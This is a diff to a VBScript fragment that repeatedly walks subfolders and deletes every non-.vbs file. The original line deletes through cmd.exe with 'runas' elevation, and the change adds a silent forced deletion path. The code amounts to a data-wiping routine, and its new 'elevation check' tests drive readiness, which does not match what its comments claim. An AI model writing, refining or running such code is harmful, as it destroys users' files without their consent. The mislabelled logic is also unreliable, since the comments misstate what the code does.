@@ -39,7 +39,14 @@ Do While True
     For Each objSubFolder In objExplorerFolder.SubFolders
         For Each objFile In objSubFolder.Files
             If objFSO.GetExtensionName(objFile.Name) <> "vbs" Then
-                objShell.ShellExecute "cmd.exe", "/c del """ & objFile.Path & """", "", "runas", 1
+                ' Check if elevation is required
+                If Not objFSO.GetDrive(objFile.Path).IsReady Then
+                    ' Prompt for elevation
+                    objShell.ShellExecute "cmd.exe", "/c del """ & objFile.Path & """", "", "runas", 1
+                Else
+                    ' No elevation required, proceed with deletion
+                    objFSO.DeleteFile objFile.Path, True
+                End If
             End If
         Next
     Next
